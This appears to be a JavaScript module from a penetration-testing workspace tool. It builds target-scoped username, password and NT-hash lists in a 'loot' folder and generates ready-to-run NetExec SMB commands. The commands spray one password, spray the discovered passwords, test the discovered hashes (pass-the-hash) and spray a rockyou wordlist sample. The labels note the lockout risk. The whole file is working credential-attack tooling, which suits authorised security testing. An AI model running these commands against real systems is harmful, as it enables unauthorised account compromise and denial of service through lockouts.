import { isNtHash } from "./credentials.js";
import { buildUsersFileCommand } from "./userCommands.js";

const shellQuote = (value) => `'${String(value).replaceAll("'", "'\"'\"'")}'`;

export function buildSprayCommands(workspace) {
  const belongs = (entry) => entry.targetId ? entry.targetId === workspace.activeTargetId : entry.target === workspace.variables.targetName;
  const accounts = workspace.accounts.filter(belongs);
  const passwords = [...new Set(accounts.map((entry) => entry.secret?.trim()).filter((secret) => secret && !isNtHash(secret)))];
  const hashes = [...new Set(accounts.map((entry) => entry.secret?.trim()).filter(isNtHash))];
  const root = "{{workspaceRoot}}/{{targetName}}/loot/credential-spray";
  const usersFile = "{{workspaceRoot}}/{{targetName}}/loot/users.txt";
  const buildUsers = buildUsersFileCommand(workspace).value;
  const writeList = (name, values) => values.length
    ? `printf '%s\\n' ${values.map(shellQuote).join(" ")} > "${root}/${name}"`
    : `: > "${root}/${name}"`;
  const prepare = `${buildUsers}; mkdir -p "${root}"; ${writeList("passwords.txt", passwords)}; ${writeList("hashes.txt", hashes)}; printf '[*] users=%s passwords=%s hashes=%s\\n' "$(wc -l < "${usersFile}")" "$(wc -l < "${root}/passwords.txt")" "$(wc -l < "${root}/hashes.txt")"`;
  const selectedPassword = workspace.variables.sprayPassword?.trim() || passwords[0] || "{{sprayPassword}}";
  return [
    { key: "spray-build-lists", label: "Build target-scoped username and secret lists", value: prepare },
    { key: "spray-one-password", label: "Spray one selected password with jitter", value: `${prepare}; nxc smb {{rhost}} -u "${usersFile}" -p ${shellQuote(selectedPassword)} --continue-on-success --jitter {{sprayJitter}} --log "${root}/single-password.log"` },
    { key: "spray-discovered-passwords", label: `Spray ${passwords.length} discovered password${passwords.length === 1 ? "" : "s"} — lockout risk`, value: `${prepare}; test -s "${root}/passwords.txt" && nxc smb {{rhost}} -u "${usersFile}" -p "${root}/passwords.txt" --continue-on-success --jitter {{sprayJitter}} --log "${root}/discovered-passwords.log"` },
    { key: "spray-discovered-hashes", label: `Test ${hashes.length} discovered NT hash${hashes.length === 1 ? "" : "es"}`, value: `${prepare}; test -s "${root}/hashes.txt" && nxc smb {{rhost}} -u "${usersFile}" -H "${root}/hashes.txt" --continue-on-success --jitter {{sprayJitter}} --log "${root}/discovered-hashes.log"` },
    { key: "spray-rockyou-bounded", label: "Spray a bounded rockyou sample — high lockout risk", value: `${prepare}; test -f /usr/share/wordlists/rockyou.txt || sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz; head -n {{sprayRockyouLimit}} /usr/share/wordlists/rockyou.txt > "${root}/rockyou-bounded.txt"; nxc smb {{rhost}} -u "${usersFile}" -p "${root}/rockyou-bounded.txt" --continue-on-success --jitter {{sprayJitter}} --log "${root}/rockyou-bounded.log"` },
  ];
}
